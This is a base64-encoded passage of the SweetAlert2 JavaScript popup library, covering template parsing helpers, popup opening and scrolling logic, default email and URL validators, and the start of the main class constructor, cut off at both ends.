ICAgfSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtEb2N1bWVudEZyYWdtZW50fSB0ZW1wbGF0ZUNvbnRlbnRcbiAgICogQHJldHVybnMge1N3ZWV0QWxlcnRPcHRpb25zfVxuICAgKi9cbiAgY29uc3QgZ2V0U3dhbEJ1dHRvbnMgPSB0ZW1wbGF0ZUNvbnRlbnQgPT4ge1xuICAgIGNvbnN0IHJlc3VsdCA9IHt9O1xuICAgIC8qKiBAdHlwZSB7SFRNTEVsZW1lbnRbXX0gKi9cbiAgICBjb25zdCBzd2FsQnV0dG9ucyA9IEFycmF5LmZyb20odGVtcGxhdGVDb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ3N3YWwtYnV0dG9uJykpO1xuICAgIHN3YWxCdXR0b25zLmZvckVhY2goYnV0dG9uID0+IHtcbiAgICAgIHNob3dXYXJuaW5nc0ZvckF0dHJpYnV0ZXMoYnV0dG9uLCBbJ3R5cGUnLCAnY29sb3InLCAnYXJpYS1sYWJlbCddKTtcbiAgICAgIGNvbnN0IHR5cGUgPSBidXR0b24uZ2V0QXR0cmlidXRlKCd0eXBlJyk7XG4gICAgICByZXN1bHRbYCR7dHlwZX1CdXR0b25UZXh0YF0gPSBidXR0b24uaW5uZXJIVE1MO1xuICAgICAgcmVzdWx0W2BzaG93JHtjYXBpdGFsaXplRmlyc3RMZXR0ZXIodHlwZSl9QnV0dG9uYF0gPSB0cnVlO1xuICAgICAgaWYgKGJ1dHRvbi5oYXNBdHRyaWJ1dGUoJ2NvbG9yJykpIHtcbiAgICAgICAgcmVzdWx0W2Ake3R5cGV9QnV0dG9uQ29sb3JgXSA9IGJ1dHRvbi5nZXRBdHRyaWJ1dGUoJ2NvbG9yJyk7XG4gICAgICB9XG4gICAgICBpZiAoYnV0dG9uLmhhc0F0dHJpYnV0ZSgnYXJpYS1sYWJlbCcpKSB7XG4gICAgICAgIHJlc3VsdFtgJHt0eXBlfUJ1dHRvbkFyaWFMYWJlbGBdID0gYnV0dG9uLmdldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcpO1xuICAgICAgfVxuICAgIH0pO1xuICAgIHJldHVybiByZXN1bHQ7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7RG9jdW1lbnRGcmFnbWVudH0gdGVtcGxhdGVDb250ZW50XG4gICAqIEByZXR1cm5zIHtTd2VldEFsZXJ0T3B0aW9uc31cbiAgICovXG4gIGNvbnN0IGdldFN3YWxJbWFnZSA9IHRlbXBsYXRlQ29udGVudCA9PiB7XG4gICAgY29uc3QgcmVzdWx0ID0ge307XG4gICAgLyoqIEB0eXBlIHtIVE1MRWxlbWVudH0gKi9cbiAgICBjb25zdCBpbWFnZSA9IHRlbXBsYXRlQ29udGVudC5xdWVyeVNlbGVjdG9yKCdzd2FsLWltYWdlJyk7XG4gICAgaWYgKGltYWdlKSB7XG4gICAgICBzaG93V2FybmluZ3NGb3JBdHRyaWJ1dGVzKGltYWdlLCBbJ3NyYycsICd3aWR0aCcsICdoZWlnaHQnLCAnYWx0J10pO1xuICAgICAgaWYgKGltYWdlLmhhc0F0dHJpYnV0ZSgnc3JjJykpIHtcbiAgICAgICAgcmVzdWx0LmltYWdlVXJsID0gaW1hZ2UuZ2V0QXR0cmlidXRlKCdzcmMnKTtcbiAgICAgIH1cbiAgICAgIGlmIChpbWFnZS5oYXNBdHRyaWJ1dGUoJ3dpZHRoJykpIHtcbiAgICAgICAgcmVzdWx0LmltYWdlV2lkdGggPSBpbWFnZS5nZXRBdHRyaWJ1dGUoJ3dpZHRoJyk7XG4gICAgICB9XG4gICAgICBpZiAoaW1hZ2UuaGFzQXR0cmlidXRlKCdoZWlnaHQnKSkge1xuICAgICAgICByZXN1bHQuaW1hZ2VIZWlnaHQgPSBpbWFnZS5nZXRBdHRyaWJ1dGUoJ2hlaWdodCcpO1xuICAgICAgfVxuICAgICAgaWYgKGltYWdlLmhhc0F0dHJpYnV0ZSgnYWx0JykpIHtcbiAgICAgICAgcmVzdWx0LmltYWdlQWx0ID0gaW1hZ2UuZ2V0QXR0cmlidXRlKCdhbHQnKTtcbiAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtEb2N1bWVudEZyYWdtZW50fSB0ZW1wbGF0ZUNvbnRlbnRcbiAgICogQHJldHVybnMge1N3ZWV0QWxlcnRPcHRpb25zfVxuICAgKi9cbiAgY29uc3QgZ2V0U3dhbEljb24gPSB0ZW1wbGF0ZUNvbnRlbnQgPT4ge1xuICAgIGNvbnN0IHJlc3VsdCA9IHt9O1xuICAgIC8qKiBAdHlwZSB7SFRNTEVsZW1lbnR9ICovXG4gICAgY29uc3QgaWNvbiA9IHRlbXBsYXRlQ29udGVudC5xdWVyeVNlbGVjdG9yKCdzd2FsLWljb24nKTtcbiAgICBpZiAoaWNvbikge1xuICAgICAgc2hvd1dhcm5pbmdzRm9yQXR0cmlidXRlcyhpY29uLCBbJ3R5cGUnLCAnY29sb3InXSk7XG4gICAgICBpZiAoaWNvbi5oYXNBdHRyaWJ1dGUoJ3R5cGUnKSkge1xuICAgICAgICAvKiogQHR5cGUge1N3ZWV0QWxlcnRJY29ufSAqL1xuICAgICAgICAvLyBAdHMtaWdub3JlXG4gICAgICAgIHJlc3VsdC5pY29uID0gaWNvbi5nZXRBdHRyaWJ1dGUoJ3R5cGUnKTtcbiAgICAgIH1cbiAgICAgIGlmIChpY29uLmhhc0F0dHJpYnV0ZSgnY29sb3InKSkge1xuICAgICAgICByZXN1bHQuaWNvbkNvbG9yID0gaWNvbi5nZXRBdHRyaWJ1dGUoJ2NvbG9yJyk7XG4gICAgICB9XG4gICAgICByZXN1bHQuaWNvbkh0bWwgPSBpY29uLmlubmVySFRNTDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtEb2N1bWVudEZyYWdtZW50fSB0ZW1wbGF0ZUNvbnRlbnRcbiAgICogQHJldHVybnMge1N3ZWV0QWxlcnRPcHRpb25zfVxuICAgKi9cbiAgY29uc3QgZ2V0U3dhbElucHV0ID0gdGVtcGxhdGVDb250ZW50ID0+IHtcbiAgICBjb25zdCByZXN1bHQgPSB7fTtcbiAgICAvKiogQHR5cGUge0hUTUxFbGVtZW50fSAqL1xuICAgIGNvbnN0IGlucHV0ID0gdGVtcGxhdGVDb250ZW50LnF1ZXJ5U2VsZWN0b3IoJ3N3YWwtaW5wdXQnKTtcbiAgICBpZiAoaW5wdXQpIHtcbiAgICAgIHNob3dXYXJuaW5nc0ZvckF0dHJpYnV0ZXMoaW5wdXQsIFsndHlwZScsICdsYWJlbCcsICdwbGFjZWhvbGRlcicsICd2YWx1ZSddKTtcbiAgICAgIC8qKiBAdHlwZSB7U3dlZXRBbGVydElucHV0fSAqL1xuICAgICAgLy8gQHRzLWlnbm9yZVxuICAgICAgcmVzdWx0LmlucHV0ID0gaW5wdXQuZ2V0QXR0cmlidXRlKCd0eXBlJykgfHwgJ3RleHQnO1xuICAgICAgaWYgKGlucHV0Lmhhc0F0dHJpYnV0ZSgnbGFiZWwnKSkge1xuICAgICAgICByZXN1bHQuaW5wdXRMYWJlbCA9IGlucHV0LmdldEF0dHJpYnV0ZSgnbGFiZWwnKTtcbiAgICAgIH1cbiAgICAgIGlmIChpbnB1dC5oYXNBdHRyaWJ1dGUoJ3BsYWNlaG9sZGVyJykpIHtcbiAgICAgICAgcmVzdWx0LmlucHV0UGxhY2Vob2xkZXIgPSBpbnB1dC5nZXRBdHRyaWJ1dGUoJ3BsYWNlaG9sZGVyJyk7XG4gICAgICB9XG4gICAgICBpZiAoaW5wdXQuaGFzQXR0cmlidXRlKCd2YWx1ZScpKSB7XG4gICAgICAgIHJlc3VsdC5pbnB1dFZhbHVlID0gaW5wdXQuZ2V0QXR0cmlidXRlKCd2YWx1ZScpO1xuICAgICAgfVxuICAgIH1cbiAgICAvKiogQHR5cGUge0hUTUxFbGVtZW50W119ICovXG4gICAgY29uc3QgaW5wdXRPcHRpb25zID0gQXJyYXkuZnJvbSh0ZW1wbGF0ZUNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnc3dhbC1pbnB1dC1vcHRpb24nKSk7XG4gICAgaWYgKGlucHV0T3B0aW9ucy5sZW5ndGgpIHtcbiAgICAgIHJlc3VsdC5pbnB1dE9wdGlvbnMgPSB7fTtcbiAgICAgIGlucHV0T3B0aW9ucy5mb3JFYWNoKG9wdGlvbiA9PiB7XG4gICAgICAgIHNob3dXYXJuaW5nc0ZvckF0dHJpYnV0ZXMob3B0aW9uLCBbJ3ZhbHVlJ10pO1xuICAgICAgICBjb25zdCBvcHRpb25WYWx1ZSA9IG9wdGlvbi5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyk7XG4gICAgICAgIGNvbnN0IG9wdGlvbk5hbWUgPSBvcHRpb24uaW5uZXJIVE1MO1xuICAgICAgICByZXN1bHQuaW5wdXRPcHRpb25zW29wdGlvblZhbHVlXSA9IG9wdGlvbk5hbWU7XG4gICAgICB9KTtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtEb2N1bWVudEZyYWdtZW50fSB0ZW1wbGF0ZUNvbnRlbnRcbiAgICogQHBhcmFtIHtzdHJpbmdbXX0gcGFyYW1OYW1lc1xuICAgKiBAcmV0dXJucyB7U3dlZXRBbGVydE9wdGlvbnN9XG4gICAqL1xuICBjb25zdCBnZXRTd2FsU3RyaW5nUGFyYW1zID0gKHRlbXBsYXRlQ29udGVudCwgcGFyYW1OYW1lcykgPT4ge1xuICAgIGNvbnN0IHJlc3VsdCA9IHt9O1xuICAgIGZvciAoY29uc3QgaSBpbiBwYXJhbU5hbWVzKSB7XG4gICAgICBjb25zdCBwYXJhbU5hbWUgPSBwYXJhbU5hbWVzW2ldO1xuICAgICAgLyoqIEB0eXBlIHtIVE1MRWxlbWVudH0gKi9cbiAgICAgIGNvbnN0IHRhZyA9IHRlbXBsYXRlQ29udGVudC5xdWVyeVNlbGVjdG9yKHBhcmFtTmFtZSk7XG4gICAgICBpZiAodGFnKSB7XG4gICAgICAgIHNob3dXYXJuaW5nc0ZvckF0dHJpYnV0ZXModGFnLCBbXSk7XG4gICAgICAgIHJlc3VsdFtwYXJhbU5hbWUucmVwbGFjZSgvXnN3YWwtLywgJycpXSA9IHRhZy5pbm5lckhUTUwudHJpbSgpO1xuICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0RvY3VtZW50RnJhZ21lbnR9IHRlbXBsYXRlQ29udGVudFxuICAgKi9cbiAgY29uc3Qgc2hvd1dhcm5pbmdzRm9yRWxlbWVudHMgPSB0ZW1wbGF0ZUNvbnRlbnQgPT4ge1xuICAgIGNvbnN0IGFsbG93ZWRFbGVtZW50cyA9IHN3YWxTdHJpbmdQYXJhbXMuY29uY2F0KFsnc3dhbC1wYXJhbScsICdzd2FsLWZ1bmN0aW9uLXBhcmFtJywgJ3N3YWwtYnV0dG9uJywgJ3N3YWwtaW1hZ2UnLCAnc3dhbC1pY29uJywgJ3N3YWwtaW5wdXQnLCAnc3dhbC1pbnB1dC1vcHRpb24nXSk7XG4gICAgQXJyYXkuZnJvbSh0ZW1wbGF0ZUNvbnRlbnQuY2hpbGRyZW4pLmZvckVhY2goZWwgPT4ge1xuICAgICAgY29uc3QgdGFnTmFtZSA9IGVsLnRhZ05hbWUudG9Mb3dlckNhc2UoKTtcbiAgICAgIGlmICghYWxsb3dlZEVsZW1lbnRzLmluY2x1ZGVzKHRhZ05hbWUpKSB7XG4gICAgICAgIHdhcm4oYFVucmVjb2duaXplZCBlbGVtZW50IDwke3RhZ05hbWV9PmApO1xuICAgICAgfVxuICAgIH0pO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBlbFxuICAgKiBAcGFyYW0ge3N0cmluZ1tdfSBhbGxvd2VkQXR0cmlidXRlc1xuICAgKi9cbiAgY29uc3Qgc2hvd1dhcm5pbmdzRm9yQXR0cmlidXRlcyA9IChlbCwgYWxsb3dlZEF0dHJpYnV0ZXMpID0+IHtcbiAgICBBcnJheS5mcm9tKGVsLmF0dHJpYnV0ZXMpLmZvckVhY2goYXR0cmlidXRlID0+IHtcbiAgICAgIGlmIChhbGxvd2VkQXR0cmlidXRlcy5pbmRleE9mKGF0dHJpYnV0ZS5uYW1lKSA9PT0gLTEpIHtcbiAgICAgICAgd2FybihbYFVucmVjb2duaXplZCBhdHRyaWJ1dGUgXCIke2F0dHJpYnV0ZS5uYW1lfVwiIG9uIDwke2VsLnRhZ05hbWUudG9Mb3dlckNhc2UoKX0+LmAsIGAke2FsbG93ZWRBdHRyaWJ1dGVzLmxlbmd0aCA/IGBBbGxvd2VkIGF0dHJpYnV0ZXMgYXJlOiAke2FsbG93ZWRBdHRyaWJ1dGVzLmpvaW4oJywgJyl9YCA6ICdUbyBzZXQgdGhlIHZhbHVlLCB1c2UgSFRNTCB3aXRoaW4gdGhlIGVsZW1lbnQuJ31gXSk7XG4gICAgICB9XG4gICAgfSk7XG4gIH07XG5cbiAgY29uc3QgU0hPV19DTEFTU19USU1FT1VUID0gMTA7XG5cbiAgLyoqXG4gICAqIE9wZW4gcG9wdXAsIGFkZCBuZWNlc3NhcnkgY2xhc3NlcyBhbmQgc3R5bGVzLCBmaXggc2Nyb2xsYmFyXG4gICAqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3Qgb3BlblBvcHVwID0gcGFyYW1zID0+IHtcbiAgICBjb25zdCBjb250YWluZXIgPSBnZXRDb250YWluZXIoKTtcbiAgICBjb25zdCBwb3B1cCA9IGdldFBvcHVwKCk7XG4gICAgaWYgKHR5cGVvZiBwYXJhbXMud2lsbE9wZW4gPT09ICdmdW5jdGlvbicpIHtcbiAgICAgIHBhcmFtcy53aWxsT3Blbihwb3B1cCk7XG4gICAgfVxuICAgIGNvbnN0IGJvZHlTdHlsZXMgPSB3aW5kb3cuZ2V0Q29tcHV0ZWRTdHlsZShkb2N1bWVudC5ib2R5KTtcbiAgICBjb25zdCBpbml0aWFsQm9keU92ZXJmbG93ID0gYm9keVN0eWxlcy5vdmVyZmxvd1k7XG4gICAgYWRkQ2xhc3Nlcyhjb250YWluZXIsIHBvcHVwLCBwYXJhbXMpO1xuXG4gICAgLy8gc2Nyb2xsaW5nIGlzICdoaWRkZW4nIHVudGlsIGFuaW1hdGlvbiBpcyBkb25lLCBhZnRlciB0aGF0ICdhdXRvJ1xuICAgIHNldFRpbWVvdXQoKCkgPT4ge1xuICAgICAgc2V0U2Nyb2xsaW5nVmlzaWJpbGl0eShjb250YWluZXIsIHBvcHVwKTtcbiAgICB9LCBTSE9XX0NMQVNTX1RJTUVPVVQpO1xuICAgIGlmIChpc01vZGFsKCkpIHtcbiAgICAgIGZpeFNjcm9sbENvbnRhaW5lcihjb250YWluZXIsIHBhcmFtcy5zY3JvbGxiYXJQYWRkaW5nLCBpbml0aWFsQm9keU92ZXJmbG93KTtcbiAgICAgIHNldEFyaWFIaWRkZW4oKTtcbiAgICB9XG4gICAgaWYgKCFpc1RvYXN0KCkgJiYgIWdsb2JhbFN0YXRlLnByZXZpb3VzQWN0aXZlRWxlbWVudCkge1xuICAgICAgZ2xvYmFsU3RhdGUucHJldmlvdXNBY3RpdmVFbGVtZW50ID0gZG9jdW1lbnQuYWN0aXZlRWxlbWVudDtcbiAgICB9XG4gICAgaWYgKHR5cGVvZiBwYXJhbXMuZGlkT3BlbiA9PT0gJ2Z1bmN0aW9uJykge1xuICAgICAgc2V0VGltZW91dCgoKSA9PiBwYXJhbXMuZGlkT3Blbihwb3B1cCkpO1xuICAgIH1cbiAgICByZW1vdmVDbGFzcyhjb250YWluZXIsIHN3YWxDbGFzc2VzWyduby10cmFuc2l0aW9uJ10pO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0FuaW1hdGlvbkV2ZW50fSBldmVudFxuICAgKi9cbiAgY29uc3Qgc3dhbE9wZW5BbmltYXRpb25GaW5pc2hlZCA9IGV2ZW50ID0+IHtcbiAgICBjb25zdCBwb3B1cCA9IGdldFBvcHVwKCk7XG4gICAgaWYgKGV2ZW50LnRhcmdldCAhPT0gcG9wdXApIHtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgY29uc3QgY29udGFpbmVyID0gZ2V0Q29udGFpbmVyKCk7XG4gICAgcG9wdXAucmVtb3ZlRXZlbnRMaXN0ZW5lcihhbmltYXRpb25FbmRFdmVudCwgc3dhbE9wZW5BbmltYXRpb25GaW5pc2hlZCk7XG4gICAgY29udGFpbmVyLnN0eWxlLm92ZXJmbG93WSA9ICdhdXRvJztcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gY29udGFpbmVyXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IHBvcHVwXG4gICAqL1xuICBjb25zdCBzZXRTY3JvbGxpbmdWaXNpYmlsaXR5ID0gKGNvbnRhaW5lciwgcG9wdXApID0+IHtcbiAgICBpZiAoYW5pbWF0aW9uRW5kRXZlbnQgJiYgaGFzQ3NzQW5pbWF0aW9uKHBvcHVwKSkge1xuICAgICAgY29udGFpbmVyLnN0eWxlLm92ZXJmbG93WSA9ICdoaWRkZW4nO1xuICAgICAgcG9wdXAuYWRkRXZlbnRMaXN0ZW5lcihhbmltYXRpb25FbmRFdmVudCwgc3dhbE9wZW5BbmltYXRpb25GaW5pc2hlZCk7XG4gICAgfSBlbHNlIHtcbiAgICAgIGNvbnRhaW5lci5zdHlsZS5vdmVyZmxvd1kgPSAnYXV0byc7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBjb250YWluZXJcbiAgICogQHBhcmFtIHtib29sZWFufSBzY3JvbGxiYXJQYWRkaW5nXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBpbml0aWFsQm9keU92ZXJmbG93XG4gICAqL1xuICBjb25zdCBmaXhTY3JvbGxDb250YWluZXIgPSAoY29udGFpbmVyLCBzY3JvbGxiYXJQYWRkaW5nLCBpbml0aWFsQm9keU92ZXJmbG93KSA9PiB7XG4gICAgaU9TZml4KCk7XG4gICAgaWYgKHNjcm9sbGJhclBhZGRpbmcgJiYgaW5pdGlhbEJvZHlPdmVyZmxvdyAhPT0gJ2hpZGRlbicpIHtcbiAgICAgIGZpeFNjcm9sbGJhcigpO1xuICAgIH1cblxuICAgIC8vIHN3ZWV0YWxlcnQyL2lzc3Vlcy8xMjQ3XG4gICAgc2V0VGltZW91dCgoKSA9PiB7XG4gICAgICBjb250YWluZXIuc2Nyb2xsVG9wID0gMDtcbiAgICB9KTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gY29udGFpbmVyXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IHBvcHVwXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgYWRkQ2xhc3NlcyA9IChjb250YWluZXIsIHBvcHVwLCBwYXJhbXMpID0+IHtcbiAgICBhZGRDbGFzcyhjb250YWluZXIsIHBhcmFtcy5zaG93Q2xhc3MuYmFja2Ryb3ApO1xuICAgIC8vIHRoaXMgd29ya2Fyb3VuZCB3aXRoIG9wYWNpdHkgaXMgbmVlZGVkIGZvciBodHRwczovL2dpdGh1Yi5jb20vc3dlZXRhbGVydDIvc3dlZXRhbGVydDIvaXNzdWVzLzIwNTlcbiAgICBwb3B1cC5zdHlsZS5zZXRQcm9wZXJ0eSgnb3BhY2l0eScsICcwJywgJ2ltcG9ydGFudCcpO1xuICAgIHNob3cocG9wdXAsICdncmlkJyk7XG4gICAgc2V0VGltZW91dCgoKSA9PiB7XG4gICAgICAvLyBBbmltYXRlIHBvcHVwIHJpZ2h0IGFmdGVyIHNob3dpbmcgaXRcbiAgICAgIGFkZENsYXNzKHBvcHVwLCBwYXJhbXMuc2hvd0NsYXNzLnBvcHVwKTtcbiAgICAgIC8vIGFuZCByZW1vdmUgdGhlIG9wYWNpdHkgd29ya2Fyb3VuZFxuICAgICAgcG9wdXAuc3R5bGUucmVtb3ZlUHJvcGVydHkoJ29wYWNpdHknKTtcbiAgICB9LCBTSE9XX0NMQVNTX1RJTUVPVVQpOyAvLyAxMG1zIGluIG9yZGVyIHRvIGZpeCAjMjA2MlxuXG4gICAgYWRkQ2xhc3MoW2RvY3VtZW50LmRvY3VtZW50RWxlbWVudCwgZG9jdW1lbnQuYm9keV0sIHN3YWxDbGFzc2VzLnNob3duKTtcbiAgICBpZiAocGFyYW1zLmhlaWdodEF1dG8gJiYgcGFyYW1zLmJhY2tkcm9wICYmICFwYXJhbXMudG9hc3QpIHtcbiAgICAgIGFkZENsYXNzKFtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsIGRvY3VtZW50LmJvZHldLCBzd2FsQ2xhc3Nlc1snaGVpZ2h0LWF1dG8nXSk7XG4gICAgfVxuICB9O1xuXG4gIHZhciBkZWZhdWx0SW5wdXRWYWxpZGF0b3JzID0ge1xuICAgIC8qKlxuICAgICAqIEBwYXJhbSB7c3RyaW5nfSBzdHJpbmdcbiAgICAgKiBAcGFyYW0ge3N0cmluZ30gdmFsaWRhdGlvbk1lc3NhZ2VcbiAgICAgKiBAcmV0dXJucyB7UHJvbWlzZTx2b2lkIHwgc3RyaW5nPn1cbiAgICAgKi9cbiAgICBlbWFpbDogKHN0cmluZywgdmFsaWRhdGlvbk1lc3NhZ2UpID0+IHtcbiAgICAgIHJldHVybiAvXlthLXpBLVowLTkuK18tXStAW2EtekEtWjAtOS4tXStcXC5bYS16QS1aMC05LV17MiwyNH0kLy50ZXN0KHN0cmluZykgPyBQcm9taXNlLnJlc29sdmUoKSA6IFByb21pc2UucmVzb2x2ZSh2YWxpZGF0aW9uTWVzc2FnZSB8fCAnSW52YWxpZCBlbWFpbCBhZGRyZXNzJyk7XG4gICAgfSxcbiAgICAvKipcbiAgICAgKiBAcGFyYW0ge3N0cmluZ30gc3RyaW5nXG4gICAgICogQHBhcmFtIHtzdHJpbmd9IHZhbGlkYXRpb25NZXNzYWdlXG4gICAgICogQHJldHVybnMge1Byb21pc2U8dm9pZCB8IHN0cmluZz59XG4gICAgICovXG4gICAgdXJsOiAoc3RyaW5nLCB2YWxpZGF0aW9uTWVzc2FnZSkgPT4ge1xuICAgICAgLy8gdGFrZW4gZnJvbSBodHRwczovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMzgwOTQzNSB3aXRoIGEgc21hbGwgY2hhbmdlIGZyb20gIzEzMDYgYW5kICMyMDEzXG4gICAgICByZXR1cm4gL15odHRwcz86XFwvXFwvKHd3d1xcLik/Wy1hLXpBLVowLTlAOiUuXyt+Iz1dezEsMjU2fVxcLlthLXpdezIsNjN9XFxiKFstYS16QS1aMC05QDolXysufiM/Ji89XSopJC8udGVzdChzdHJpbmcpID8gUHJvbWlzZS5yZXNvbHZlKCkgOiBQcm9taXNlLnJlc29sdmUodmFsaWRhdGlvbk1lc3NhZ2UgfHwgJ0ludmFsaWQgVVJMJyk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGZ1bmN0aW9uIHNldERlZmF1bHRJbnB1dFZhbGlkYXRvcnMocGFyYW1zKSB7XG4gICAgLy8gVXNlIGRlZmF1bHQgYGlucHV0VmFsaWRhdG9yYCBmb3Igc3VwcG9ydGVkIGlucHV0IHR5cGVzIGlmIG5vdCBwcm92aWRlZFxuICAgIGlmICghcGFyYW1zLmlucHV0VmFsaWRhdG9yKSB7XG4gICAgICBPYmplY3Qua2V5cyhkZWZhdWx0SW5wdXRWYWxpZGF0b3JzKS5mb3JFYWNoKGtleSA9PiB7XG4gICAgICAgIGlmIChwYXJhbXMuaW5wdXQgPT09IGtleSkge1xuICAgICAgICAgIHBhcmFtcy5pbnB1dFZhbGlkYXRvciA9IGRlZmF1bHRJbnB1dFZhbGlkYXRvcnNba2V5XTtcbiAgICAgICAgfVxuICAgICAgfSk7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgZnVuY3Rpb24gdmFsaWRhdGVDdXN0b21UYXJnZXRFbGVtZW50KHBhcmFtcykge1xuICAgIC8vIERldGVybWluZSBpZiB0aGUgY3VzdG9tIHRhcmdldCBlbGVtZW50IGlzIHZhbGlkXG4gICAgaWYgKCFwYXJhbXMudGFyZ2V0IHx8IHR5cGVvZiBwYXJhbXMudGFyZ2V0ID09PSAnc3RyaW5nJyAmJiAhZG9jdW1lbnQucXVlcnlTZWxlY3RvcihwYXJhbXMudGFyZ2V0KSB8fCB0eXBlb2YgcGFyYW1zLnRhcmdldCAhPT0gJ3N0cmluZycgJiYgIXBhcmFtcy50YXJnZXQuYXBwZW5kQ2hpbGQpIHtcbiAgICAgIHdhcm4oJ1RhcmdldCBwYXJhbWV0ZXIgaXMgbm90IHZhbGlkLCBkZWZhdWx0aW5nIHRvIFwiYm9keVwiJyk7XG4gICAgICBwYXJhbXMudGFyZ2V0ID0gJ2JvZHknO1xuICAgIH1cbiAgfVxuXG4gIC8qKlxuICAgKiBTZXQgdHlwZSwgdGV4dCBhbmQgYWN0aW9ucyBvbiBwb3B1cFxuICAgKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGZ1bmN0aW9uIHNldFBhcmFtZXRlcnMocGFyYW1zKSB7XG4gICAgc2V0RGVmYXVsdElucHV0VmFsaWRhdG9ycyhwYXJhbXMpO1xuXG4gICAgLy8gc2hvd0xvYWRlck9uQ29uZmlybSAmJiBwcmVDb25maXJtXG4gICAgaWYgKHBhcmFtcy5zaG93TG9hZGVyT25Db25maXJtICYmICFwYXJhbXMucHJlQ29uZmlybSkge1xuICAgICAgd2Fybignc2hvd0xvYWRlck9uQ29uZmlybSBpcyBzZXQgdG8gdHJ1ZSwgYnV0IHByZUNvbmZpcm0gaXMgbm90IGRlZmluZWQuXFxuJyArICdzaG93TG9hZGVyT25Db25maXJtIHNob3VsZCBiZSB1c2VkIHRvZ2V0aGVyIHdpdGggcHJlQ29uZmlybSwgc2VlIHVzYWdlIGV4YW1wbGU6XFxuJyArICdodHRwczovL3N3ZWV0YWxlcnQyLmdpdGh1Yi5pby8jYWpheC1yZXF1ZXN0Jyk7XG4gICAgfVxuICAgIHZhbGlkYXRlQ3VzdG9tVGFyZ2V0RWxlbWVudChwYXJhbXMpO1xuXG4gICAgLy8gUmVwbGFjZSBuZXdsaW5lcyB3aXRoIDxicj4gaW4gdGl0bGVcbiAgICBpZiAodHlwZW9mIHBhcmFtcy50aXRsZSA9PT0gJ3N0cmluZycpIHtcbiAgICAgIHBhcmFtcy50aXRsZSA9IHBhcmFtcy50aXRsZS5zcGxpdCgnXFxuJykuam9pbignPGJyIC8+Jyk7XG4gICAgfVxuICAgIGluaXQocGFyYW1zKTtcbiAgfVxuXG4gIGxldCBjdXJyZW50SW5zdGFuY2U7XG4gIGNsYXNzIFN3ZWV0QWxlcnQge1xuICAgIGNvbnN0cnVjdG9yKCkge1xuICAgICAgLy8gUHJldmVudCBydW4gaW4gTm9kZSBlbnZcbiAgICAgIGlmICh0eXBlb2Ygd2luZG93ID09PSAndW5kZWZpbmVkJykge1xuICAgICAgICByZXR1cm47XG4gICAgICB9XG4gICAgICBjdXJyZW50SW5zdGFuY2UgPSB0aGlzO1xuXG4gICAgICAvLyBAdHMtaWdub3JlXG4gICAgICBmb3IgKHZhciBfbGVuID0gYXJndW1lbnRzLmxlbmd0aCwgYXJncyA9IG5ldyBBcnJheShfbGVuKSwgX2tleSA9IDA7IF9rZXkgPCBfbGVuOyBfa2V5KyspIHtcbiAgICAgICAgYXJnc1tfa2V5XSA9IGFyZ3VtZW50c1tfa2V5XTtcbiAgICAgIH1cbiAgICAgIGNvbnN0IG91dGVyUGFyYW1zID0gT2JqZWN0LmZyZWV6ZSh0aGlzLmNvbnN0cnVjdG9yLmFyZ3NUb1BhcmFtcyhhcmdzKSk7XG4gICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyh0aGlzLCB7XG4gICAgICAgIHBhcmFtczoge1xuICAgICAgICAgIHZhbHVlOiBvdXRlclBhcmFtcyxcbiAgICAgICAgICB3cml0YWJsZTogZmFsc2UsXG4gICAgICAgICAgZW51bWVyYWJsZTogdHJ1ZSxcbiAgICAgICAgICBjb25maWd1cmFibGU6IHRydWVcbiAgICAgICAgfVxuICAgICAgfSk7XG5cbiAgICAgIC8vIEB0cy1pZ25vcmVcbiAgICAgIGNvbnN0IHByb21pc2UgPSBjdXJyZW50SW5zdGFuY2UuX21haW4oY3VycmVudEluc3RhbmNlLnBhcmFtcyk7XG4gICAgICBwcml2YXRlUHJvcHMucHJvbWlzZS5zZXQodGhpcywgcHJvbWlzZSk7XG4gICAgfVxuICAgIF9tYWluKHVzZXJQYXJhbXMpIHtcbiAgICAgIGxldCBtaXhpblBhcmFtcyA9IGFyZ3VtZW50cy5sZW5ndGggPi